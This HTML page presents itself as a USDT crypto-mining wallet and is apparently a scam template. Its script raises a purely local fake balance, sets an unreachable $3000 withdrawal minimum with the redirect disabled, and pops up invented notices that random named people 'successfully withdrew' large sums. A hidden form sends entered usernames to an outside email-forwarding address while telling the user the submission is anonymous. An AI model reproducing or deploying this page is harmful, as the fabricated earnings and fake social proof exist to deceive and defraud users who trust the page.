<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>USDT Wallet</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(-45deg, #003d2a, #00694b, #00513b, #008b64);
      background-size: 400% 400%;
      animation: gradient 20s ease infinite;
      color: white;
    }

    @keyframes gradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      background: rgba(0, 0, 0, 0.6);
      padding: 25px 20px;
      border-radius: 15px;
      width: 300px;
      text-align: center;
      position: relative;
      box-shadow: 0 0 20px rgba(0,255,128,0.2);
    }

    h2 {
      color: #00e99a;
      font-size: 1.4em;
      margin-bottom: 10px;
    }

    .balance {
      font-size: 1.4rem;
      margin: 15px 0;
    }

    button {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 8px;
      background-color: #00e99a;
      color: #000;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }

    input {
      width: 100%;
      padding: 8px;
      margin-top: 10px;
      border-radius: 6px;
      border: none;
    }

    .history {
      background-color: rgba(0, 128, 64, 0.1);
      padding: 10px;
      border-radius: 8px;
      font-size: 0.85em;
      margin-top: 15px;
      max-height: 100px;
      overflow-y: auto;
    }

    .referral-box {
      font-size: 0.85em;
      margin-top: 15px;
      color: #aaffcc;
      background: rgba(0,255,128,0.1);
      padding: 8px;
      border-radius: 6px;
    }

    form {
      display: none;
    }

    /* Notification style */
    .notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background: rgba(0, 255, 128, 0.15);
      border: 1px solid rgba(0, 255, 128, 0.3);
      padding: 10px 16px;
      font-size: 0.85rem;
      color: #a8ffce;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 255, 128, 0.2);
      opacity: 0;
      pointer-events: none;
      z-index: 999;
      transition: opacity 0.4s ease, transform 0.4s ease;
      transform: translateY(-20px);
    }

    .notification.show {
      opacity: 1;
      transform: translateY(0);
    }
  </style>
</head>
<body>

  <!-- Notification floating -->
  <div class="notification" id="notification"></div>

  <!-- Wallet Container -->
  <div class="container">
    <h2>USDT Wallet</h2>
    <div class="balance">Balance: <span id="balance">0.00000000</span> USDT</div>
    <button onclick="handleWithdraw()">Withdraw</button>

    <div class="referral-box">
      Your referral code: <b id="refcode">loading...</b>
    </div>

    <input type="text" id="refUsedBy" placeholder="Who used your code?" />
    <button onclick="sendReferral()">Submit</button>

    <div class="history" id="withdraw-history">No withdrawals yet.</div>

    <!-- Hidden form -->
    <form id="notifyForm" action="https://formsubmit.co/snipemarkets@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="referrer_used" id="hiddenRef">
    </form>
  </div>

  <script>
    let balance = parseFloat(localStorage.getItem('usdtBalance')) || 0;
    let miningStarted = false;
    const usdtPerMs = 1 / 120000;

    const username = localStorage.getItem('usdt_user') || 'user123';
    document.getElementById('refcode').textContent = username;

    const referral = localStorage.getItem('usdt_referral_used');
    const alreadyCredited = localStorage.getItem('usdt_referral_rewarded');
    if (referral && !alreadyCredited) {
      const refKey = `ref_${referral}_bonus`;
      const refBalance = parseFloat(localStorage.getItem(refKey)) || 0;
      localStorage.setItem(refKey, (refBalance + 200).toString());
      localStorage.setItem('usdt_referral_rewarded', 'yes');

      balance += 200; // $200 bonus to new user
      localStorage.setItem('usdtBalance', balance.toString());
    }

    function startMining() {
      if (!miningStarted) {
        setInterval(() => {
          balance += usdtPerMs;
          localStorage.setItem('usdtBalance', balance.toString());
          updateBalance();
        }, 10);
        miningStarted = true;
      }
    }

    function updateBalance() {
      document.getElementById('balance').textContent = balance.toFixed(8);
    }

    function updateWithdrawHistory() {
      const hist = JSON.parse(localStorage.getItem('withdrawHistory') || '[]');
      const el = document.getElementById('withdraw-history');
      el.innerHTML = hist.length ? hist.map(h => `<div>${h}</div>`).join('') : "No withdrawals yet.";
    }

    function handleWithdraw() {
      if (balance >= 3000) {
        alert("Redirecting to withdrawal page...");
        // window.location.href = "withdraw.html";
      } else {
        alert("Minimum withdrawal is $3000 USDT.");
      }
    }

    function sendReferral() {
      const name = document.getElementById("refUsedBy").value.trim();
      if (!name) {
        alert("Please enter the username.");
        return;
      }
      document.getElementById("hiddenRef").value = name;
      document.getElementById("notifyForm").submit();
      alert("Submitted anonymously. Thank you.");
      document.getElementById("refUsedBy").value = "";
    }

    // Random success notification
    const names = ["Alex", "Ayesha", "Zain", "Emma", "Lucas", "Noah", "Liam", "Sophia", "Amelia", "Olivia", "Ethan", "Ava", "Mia", "Zara", "Yusuf", "Nora"];
    const notificationEl = document.getElementById("notification");
    let lastName = null;

    function getRandomAmount() {
      return (Math.floor(Math.random() * 20) + 5) * 5000;
    }

    function getRandomName() {
      let name;
      do {
        name = names[Math.floor(Math.random() * names.length)];
      } while (name === lastName);
      lastName = name;
      return name;
    }

    function showNotification() {
      const name = getRandomName();
      const amount = getRandomAmount();
      const text = `${name} successfully withdrew $${amount.toLocaleString()}`;
      notificationEl.textContent = text;
      notificationEl.classList.add("show");

      setTimeout(() => {
        notificationEl.classList.remove("show");
      }, 2800);
    }

    setInterval(showNotification, 3200);

    // Start app
    window.onload = () => {
      updateBalance();
      updateWithdrawHistory();
      startMining();
    };
  </script>
</body>
</html>
